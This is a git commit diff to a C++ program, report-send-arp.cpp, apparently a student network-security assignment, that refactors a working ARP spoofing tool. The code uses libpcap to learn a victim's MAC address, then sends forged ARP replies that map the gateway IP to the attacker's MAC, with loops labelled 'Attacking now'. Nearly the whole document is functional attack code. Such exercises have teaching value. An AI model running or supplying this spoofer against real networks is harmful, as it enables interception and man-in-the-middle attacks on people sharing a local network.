b67ba25363a86600ad67b6828ab41ad09ec4e3ab
Judol <wskje0106@ewha.ac.kr>
2025-08-03 00:49:51 -0400

    modify report-send-arp.cpp

--- report-send-arp.cpp
+++ report-send-arp.cpp
@@ -1,4 +1,5 @@
 #include <cstdio>
+#include <stdint.h>
 #include <pcap.h>
 #include <string.h>
 #include <string>
@@ -19,7 +20,7 @@ struct EthArpPacket {
 	arp_hdr arp;
 };
 
-int* split(int* tip, char argv[])
+uint8_t* split(uint8_t* tip, char argv[])
 {
     char* token = strtok(argv, ".");
     int i = 0;
@@ -30,46 +31,32 @@ int* split(int* tip, char argv[])
     return tip;
 }
 
-
-int main(int argc, char* argv[]) {
-
-	if (argc < 3 || argc%2 != 0) {
-    fprintf(stderr, "Usage: %s <interface> <sender-ip> <target-ip>\n", argv[0]);
-    return EXIT_FAILURE;
-}
-
-
-	// 1-1. 나의 MAC 알아오기
-
+void getMyMac(u_char *mymac, char NI[])
+{
 	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
         perror("Failed to create socket");
-        return 1;
+        exit(1);
     }
 
-    // 인터페이스 이름 설정
-    char* ifname = argv[1];
-
-    // 인터페이스 정보 구조체 생성
+    char* ifname = NI;
     struct ifreq ifr;
     memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
 
-    // MAC 주소 가져오기
     if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
         perror("Failed to get MAC address");
-        return 1;
+        exit(1);
     }
-
-    // MAC 주소 저장
-    unsigned char *mymac = (unsigned char*) ifr.ifr_hwaddr.sa_data;
-
     close(sockfd);
+	memcpy(mymac, ifr.ifr_hwaddr.sa_data, 6);
+}
 
-	// 1-2. 나의 IP 알아오기
+void getMyIP(uint8_t *myIP, char NI[])
+{
 	struct ifaddrs *ifaddr, *ifa;
     int family, s;
-    char myip[NI_MAXHOST] = {0};  // 여기에 wlan0의 IP를 저장
+    char myip[NI_MAXHOST] = {0};  
 
     if (getifaddrs(&ifaddr) == -1) {
         perror("getifaddrs");
@@ -83,7 +70,7 @@ int main(int argc, char* argv[]) {
         family = ifa->ifa_addr->sa_family;
 
         if (family == AF_INET) { 
-            if (strcmp(ifa->ifa_name, argv[1]) == 0) {
+            if (strcmp(ifa->ifa_name, NI) == 0) {
                 s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                                 myip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
                 if (s != 0) {
@@ -91,17 +78,53 @@ int main(int argc, char* argv[]) {
                     freeifaddrs(ifaddr);
                     exit(EXIT_FAILURE);
                 }
-
                 break;
             }
         }
     }
 
     freeifaddrs(ifaddr);
+	myIP = split(myIP, myip);
 
-    // 만약 myip를 다른 곳에서 쓴다면 여기서 확인
-    // printf("My IP: %s\n", myip);
-	// 2. sender의 MAC 알아오기
+}
+
+EthArpPacket makeArpPacket(uint16_t oper, u_char *smac, u_char *dmac, u_char *arp_smac, u_char *arp_tmac, uint8_t *sip, uint8_t *tip)
+{
+	EthArpPacket packet;
+
+	packet.eth.ethType = htons(0x0806);
+	packet.arp.HType = htons(0x0001);
+	packet.arp.PType = htons(0x0800);
+	packet.arp.HLen = 0x06;
+	packet.arp.PLen = 0x04;
+	packet.arp.Oper = htons(oper);
+
+	for(int i=0; i<6; i++){
+		packet.eth.smac[i]=smac[i];
+		packet.eth.dmac[i]=dmac[i];
+		packet.arp.smac[i]=arp_smac[i];
+		packet.arp.tmac[i]=arp_tmac[i];
+	}
+
+	for(int i=0; i<4; i++){
+	packet.arp.sip[i] = sip[i];
+	packet.arp.tip[i] = tip[i];
+	}
+
+	return packet;
+}
+
+int main(int argc, char* argv[]) {
+
+	if (argc < 3 || argc%2 != 0) {
+    fprintf(stderr, "Usage: %s <interface> <sender-ip> <target-ip>\n", argv[0]);
+    return EXIT_FAILURE;
+}
+
+	u_char mymac[6];
+	uint8_t myip[4];
+	getMyMac(mymac, argv[1]);
+	getMyIP(myip, argv[1]);
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -110,51 +133,37 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return EXIT_FAILURE;
 	}
-	
-	int vip_arr[4];
-	int *vip = split(vip_arr, argv[2]);
-	int mip_arr[4];
-	int *mip = split(mip_arr, myip);
+
+	int cnt = (argc -2) / 2;
+	int i = 2;
+	while(cnt--)
+	{
+	// get sender's MAC
+	uint8_t vip_arr[4];
+	uint8_t *vip = split(vip_arr, argv[i]);
+	uint8_t gip_arr[4];
+	uint8_t *gip = split(gip_arr, argv[i+1]);
+	u_char ff[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+	u_char zero[] = {0,0,0,0,0,0};
+	uint8_t vmac[6];
 
 	EthArpPacket packet;
 	EthArpPacket attackPacket;
 
-	for(int i=0; i<6; i++){
-		packet.eth.smac[i]=mymac[i];
-		packet.eth.dmac[i]=0xFF;
-		packet.arp.smac[i]=mymac[i];
-		packet.arp.tmac[i]=0x00;
-	}
-
-	for(int i=0; i<4; i++){
-	packet.arp.sip[i] = mip[i];
-	packet.arp.tip[i] = vip[i];
-	}
-
-
-	packet.eth.ethType = htons(0x0806);
-
-	packet.arp.HType = htons(0x0001);
-	packet.arp.PType = htons(0x0800);
-	packet.arp.HLen = 0x06;
-	packet.arp.PLen = 0x04;
-	packet.arp.Oper = htons(0x0001);
+	packet = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, vip);
 
 		pcap_t* res_pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-		int cnt = 0;
+
 		while(true){
 		
 		// arp request
-		if(cnt%5 ==0){
-			printf("패킷 전송\n");
+			printf("sent an ARP packet\n");
 			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 			if (res != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 			}
-		}
 
-		printf("돌아가는 중\n");
-
+		printf("receiving packets\n");
 		// arp response
 		struct pcap_pkthdr *header;
 		const u_char *data;
@@ -173,59 +182,32 @@ int main(int argc, char* argv[]) {
 		if (ntohs(res_packet->arp.Oper) != 0x0002) continue;
 
 		for(int i=0; i<4; i++){
-			// if(res_packet->arp.tip[i] != mip[i] || res_packet->arp.sip[i] != vip[i]) continue;
 			if(res_packet->arp.sip[i] != vip[i]) continue;
 		}
-
-		for(int i=0; i<6; i++)
-		{
-			attackPacket.eth.dmac[i] = res_packet->arp.smac[i];
-			attackPacket.eth.smac[i] = mymac[i];
-			attackPacket.arp.tmac[i] = res_packet->arp.smac[i];
-			attackPacket.arp.smac[i] = mymac[i];
-		}
-			pcap_close(pcap);
+			memcpy(vmac,res_packet->arp.smac, sizeof(uint8_t)*6 );
 			break;
-		
+		}
+	
+		// attack
+		attackPacket = makeArpPacket(0x0002, mymac, vmac, mymac, vmac, gip, vip);
+		pcap_t* attack_pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
+		if (attack_pcap == nullptr) {
+			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+			return EXIT_FAILURE;
+		}
+
+		printf("Attacking now\n");
+		for(int i=0; i<10; i++)
+		{
+		int attack_res = pcap_sendpacket(attack_pcap, reinterpret_cast<const u_char*>(&attackPacket), sizeof(EthArpPacket));
+		if (attack_res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", attack_res, pcap_geterr(attack_pcap));
+		}
 		}
 		
 		pcap_close(res_pcap);
-
-
-		// 3. 공격 패킷 구성
-		attackPacket.eth.ethType = htons(0x0806);
-
-		int gip_arr[4];
-		int *gip = split(gip_arr, argv[3]);
-
-		for(int i=0; i<4; i++){
-			attackPacket.arp.sip[i] = gip[i];
-			attackPacket.arp.tip[i]=vip[i];
-		}
-
-		attackPacket.arp.HType = htons(0x0001);
-		attackPacket.arp.PType = htons(0x0800);
-		attackPacket.arp.HLen = 0x06;
-		attackPacket.arp.PLen = 0x04;
-		attackPacket.arp.Oper = htons(0x0002);
-
-		// 4. 공격 패킷 전송
-	pcap_t* attack_pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (pcap == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return EXIT_FAILURE;
+		pcap_close(attack_pcap);
 	}
-
-	while(true)
-	{
-	printf("Now Attacking\n");
-	int attack_res = pcap_sendpacket(attack_pcap, reinterpret_cast<const u_char*>(&attackPacket), sizeof(EthArpPacket));
-	if (attack_res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", attack_res, pcap_geterr(attack_pcap));
-	}
-	sleep(5);
-	}
-
-	// pcap_close(attack_pcap);
+	pcap_close(pcap);
 
 }
